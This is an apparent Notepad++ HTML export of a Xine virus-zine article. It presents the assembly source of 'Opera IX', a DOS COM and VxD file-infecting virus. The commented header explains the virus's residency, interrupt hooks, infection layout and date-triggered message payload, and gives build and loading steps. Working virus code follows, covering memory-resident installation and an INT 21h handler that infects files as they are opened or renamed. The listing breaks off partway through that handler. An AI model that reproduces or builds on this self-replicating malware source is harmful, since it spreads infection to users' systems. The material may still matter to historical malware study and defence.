<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                              ³ Xine - issue #5 - Phile 210 ³</span><span class="sc0">
</span><span class="sc1">;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ DOS16/VxD.Opera IX ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This virus is a simple COM (including ENUNS) and VxD infector. I wrote it</span><span class="sc0">
</span><span class="sc1">; to demonstrate VxD real-mode infection and then added COM support to make it</span><span class="sc0">
</span><span class="sc1">; more effective.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1. Virus analysis ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   When the virus receives execution control, it makes its residency check,</span><span class="sc0">
</span><span class="sc1">; goes resident (if necessary) using a generic way and activates the payload</span><span class="sc0">
</span><span class="sc1">; if the current date matches the one of the payload. Then, it hooks interrupt</span><span class="sc0">
</span><span class="sc1">; vectors, reloads the original code and transfers execution to it.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.1. Residency ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To go resident, the virus finds a suitable MCB/UMB, shrinks it to create a</span><span class="sc0">
</span><span class="sc1">; new one and copies the virus code to the allocated space.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.2. Interrupt hooks ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The INT 21h hook, handles the infection of COM and VxD files, whereas the</span><span class="sc0">
</span><span class="sc1">; INT 2Fh hook, handles the residency check and rehooks INT 21h.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.3. Payload ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The virus decrypts and displays the following string:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; "Opera IX, Horned Beast/VADER"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.4.1. File map: COM ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Before infection           After infection</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³      Virus code      ³</span><span class="sc0">
</span><span class="sc1">; ³       COM data       ³   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³       COM data       ³</span><span class="sc0">
</span><span class="sc1">;                            ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³      ENUNS data      ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.4.2. File map: VxD ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Before infection           After infection</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ³       VxD data       ³   ³       VxD data       ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³ Real-mode init proc  ³   ³      Virus code      ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³       VxD data       ³   ³       VxD data       ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³ Real-mode init proc  ³</span><span class="sc0">
</span><span class="sc1">;                            ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³      ENUNS data      ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 2. Assembling and compiling ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Compile it to a COM file, using:</span><span class="sc0">
</span><span class="sc1">; tasm opera9 /ml /m5</span><span class="sc0">
</span><span class="sc1">; tlink opera9 /t</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 3. Loading ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Execute the virus loader. The virus will then stay resident and infect any</span><span class="sc0">
</span><span class="sc1">; accessed files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 4. Disinfection ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Decrypt and copy Virus_Size bytes at position EOF-(Virus_Size+ENUNS_Size)</span><span class="sc0">
</span><span class="sc1">; to the start of file (COM files) or to the start of the real-mode init proc</span><span class="sc0">
</span><span class="sc1">; (VxD files), fixing the appropriate "OH_size" and "LE_eip" fields (if neces-</span><span class="sc0">
</span><span class="sc1">; sary). Then, reduce the file size by (Virus_Size+ENUNS_Size) bytes.</span><span class="sc0">

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">OPERA9.ASM</span><span class="sc0"> ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                </span><span class="sc9">.Model</span><span class="sc0">  </span><span class="sc10">Tiny</span><span class="sc0">
                </span><span class="sc9">.Code</span><span class="sc0">
                </span><span class="sc2">.386</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">DOS.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">LE.INC</span><span class="sc0">

                </span><span class="sc9">.Radix</span><span class="sc0">  </span><span class="sc2">16d</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PSP</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">Real_Mode_End</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
</span><span class="sc5">Virus_Resident_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">Resident_End</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
</span><span class="sc5">Virus_Resident_PSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">Virus_Resident_Size</span><span class="sc4">+</span><span class="sc2">15d</span><span class="sc4">)/</span><span class="sc2">16d</span><span class="sc0">
</span><span class="sc5">ENUNS_Size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">Save_i24</span><span class="sc4">-</span><span class="sc5">ENUNS_Mark</span><span class="sc0">
</span><span class="sc5">Virus_Sign</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc12">'HB'</span><span class="sc0"> </span><span class="sc1">;"Horned Beast"</span><span class="sc0">
</span><span class="sc5">Payload_Date</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">719</span><span class="sc0"> </span><span class="sc1">;Payload activation date</span><span class="sc0">
</span><span class="sc5">Min_Size</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">Virus_Size</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">
</span><span class="sc5">Max_Size</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">-</span><span class="sc5">Min_Size</span><span class="sc0">

</span><span class="sc5">Real_Mode_Start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PSP</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Return_IP</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PSP</span><span class="sc0">
</span><span class="sc5">Start_IP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0"> </span><span class="sc1">;Residency check</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Not_Resident</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;Virus CS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Reload_File</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">Not_Resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc1">;Get list of lists</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1600</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0"> </span><span class="sc1">;Windows enhanced mode installation check</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Use_MCBs</span><span class="sc0"> </span><span class="sc1">;Windows running</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Pointer to disk buffer info record</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Segment of first UMB (or -1)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Use_MCBs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Allocate_Block</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Allocation_Done</span><span class="sc0">
</span><span class="sc5">Use_MCBs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Segment of first MCB</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Allocate_Block</span><span class="sc0">
</span><span class="sc5">Allocation_Done</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">Virus_Size</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0"> </span><span class="sc1">;Copy virus code</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Mem_Return</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc1">;Get real-time clock date</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">No_Payload</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Payload_Date</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">No_Payload</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Virus_Name</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc1">;Display virus name</span><span class="sc0">
</span><span class="sc5">Display_Next_Char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc1">;Fast console output</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Last char</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Display_Next_Char</span><span class="sc0">
</span><span class="sc5">No_Payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

                </span><span class="sc9">.Radix</span><span class="sc0">  </span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc5">Virus_Name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">41</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">47</span><span class="sc4">,</span><span class="sc2">62</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc0">
</span><span class="sc1">;Encrypted "Opera IX, Horned Beast/VADER",0</span><span class="sc0">
                </span><span class="sc9">.Radix</span><span class="sc0">  </span><span class="sc2">16d</span><span class="sc0">

</span><span class="sc5">Mem_Return</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook_i21_Vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Handler_i2f</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Save_i2f</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook_Vector</span><span class="sc0">
</span><span class="sc5">Reload_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Reload_COM</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Reload_Done</span><span class="sc0">
</span><span class="sc5">Reload_COM</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PSP_Environment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">Seek_Name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Seek_Name</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Open current file (read mode)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Close current file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Reload_Done</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;Interrupt vector handlers</span><span class="sc0">
</span><span class="sc5">Handler_i21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3303</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Exec</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Old_i21</span><span class="sc0">
                </span><span class="sc1">;Indicate that Handler_i21 is working</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Check_Open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infect_File</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infect_File</span><span class="sc0">
